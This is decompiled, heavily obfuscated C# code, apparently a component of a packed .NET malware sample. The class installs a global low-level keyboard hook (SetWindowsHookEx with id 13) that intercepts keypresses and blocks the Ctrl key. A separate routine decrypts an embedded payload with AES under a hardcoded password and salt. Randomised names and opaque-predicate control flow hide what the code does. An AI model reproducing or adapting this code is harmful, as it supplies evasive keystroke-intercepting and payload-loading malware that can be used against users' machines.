using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Rjyqizekkumrq;

namespace SHUV_002D3.Containers;

public class AlgoAuthenticationContainer
{
	private delegate IntPtr GetterExporterStub(int nCode, IntPtr wParam, IntPtr lParam);

	private static GetterExporterStub registry = RegisterProducer;

	private static IntPtr _Publisher = IntPtr.Zero;

	private static byte[] param = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };

	private static byte[] m_Exporter;

	internal static AlgoAuthenticationContainer ConcatContext;

	[DllImport("user32.dll")]
	private static extern IntPtr SetWindowsHookEx(int idxv, GetterExporterStub vis, IntPtr template, uint res2_low);

	[DllImport("user32.dll")]
	private static extern bool UnhookWindowsHookEx(IntPtr last);

	[DllImport("user32.dll")]
	private static extern IntPtr CallNextHookEx(IntPtr v, int resultX, int consumer, IntPtr task2);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string param);

	public static byte[] FillProducer(byte[] key)
	{
		using MemoryStream instance = new MemoryStream();
		return CollectProducer(instance, key);
	}

	public static void CountProducer()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		ClassLibrary val = new ClassLibrary();
		IntPtr template = LoadLibrary("User32");
		val.Data();
		_Publisher = SetWindowsHookEx(13, registry, template, 0u);
		int num = 0;
		if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_59a06957fcba4600a8e9ac3edaf97d17 == 0)
		{
			int num2 = default(int);
			num = num2;
		}
		switch (num)
		{
		}
	}

	public static void PostProducer()
	{
		UnhookWindowsHookEx(_Publisher);
	}

	public static IntPtr RegisterProducer(int version_instance, IntPtr selection, IntPtr util)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		IntPtr result;
		while (true)
		{
			IL_006f:
			if (version_instance >= 0)
			{
				while (selection == (IntPtr)256)
				{
					if (Marshal.ReadInt32(util).ToString() == "162")
					{
						MessageBox.Show("You pressed a CTR");
					}
					result = ExcludeContext(1);
					if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_156acf50bb6c42e2a8255ff7bb724e7b != 0)
					{
						switch (1)
						{
						case 3:
							break;
						case 4:
							goto IL_006f;
						case 2:
							goto end_IL_005b;
						default:
							goto end_IL_006f;
						}
						continue;
					}
					goto end_IL_006f;
					continue;
					end_IL_005b:
					break;
				}
			}
			result = CallNextHookEx(_Publisher, version_instance, (int)selection, util);
			break;
			continue;
			end_IL_006f:
			break;
		}
		return result;
	}

	private static byte[] CollectProducer(MemoryStream instance, byte[] cont)
	{
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		ConnectContext(rijndaelManaged, 256);
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(m_Exporter, param, 1000);
		int num = 1;
		if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_1ea0f64528614d1e83b1ab65fdfcf922 == 0)
		{
			goto IL_0093;
		}
		goto IL_00d8;
		IL_00d8:
		byte[] result = default(byte[]);
		while (true)
		{
			switch (num)
			{
			case 2:
			{
				CryptoStream cryptoStream = new CryptoStream(instance, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
				try
				{
					cryptoStream.Write(cont, 0, cont.Length);
					AwakeContext(cryptoStream);
				}
				finally
				{
					if (cryptoStream != null)
					{
						CloneContext(cryptoStream);
					}
				}
				goto IL_0078;
			}
			case 1:
				break;
			default:
				return result;
			}
			break;
			IL_0078:
			result = instance.ToArray();
			num = 0;
			if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_0ecf77b8f7514df49b8a43abfefe358b != 0)
			{
				continue;
			}
			goto IL_008d;
		}
		goto IL_0093;
		IL_008d:
		int num2 = default(int);
		num = num2;
		goto IL_00d8;
		IL_0093:
		ComputeContext(rijndaelManaged, rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8));
		rijndaelManaged.IV = (byte[])CountContext(rfc2898DeriveBytes, rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		num = 2;
		if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_65374424dd0c4f6caacb7db21240d6f1 == 0)
		{
			goto IL_008d;
		}
		goto IL_00d8;
	}

	static AlgoAuthenticationContainer()
	{
		int num = 0;
		if (_003CModule_003E_007Bce07eb46_002D7fe1_002D4ead_002Dbc61_002D86bf4ccd807c_007D.m_54dd6648f3654d829e4db8060c95cba4 == 0)
		{
			int num2 = default(int);
			num = num2;
		}
		switch (num)
		{
		}
		m_Exporter = Encoding.UTF8.GetBytes("Fcbbedrdfqyy");
	}

	internal static bool WriteContext()
	{
		return ConcatContext == null;
	}

	internal static AlgoAuthenticationContainer PrepareContext()
	{
		return ConcatContext;
	}

	internal static IntPtr ExcludeContext(int int_0)
	{
		return (IntPtr)int_0;
	}

	internal static void ConnectContext(object object_0, int int_0)
	{
		((SymmetricAlgorithm)object_0).KeySize = int_0;
	}

	internal static void ComputeContext(object object_0, object object_1)
	{
		((SymmetricAlgorithm)object_0).Key = (byte[])object_1;
	}

	internal static object CountContext(object object_0, int int_0)
	{
		return ((DeriveBytes)object_0).GetBytes(int_0);
	}

	internal static void AwakeContext(object object_0)
	{
		((Stream)object_0).Close();
	}

	internal static void CloneContext(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}
}
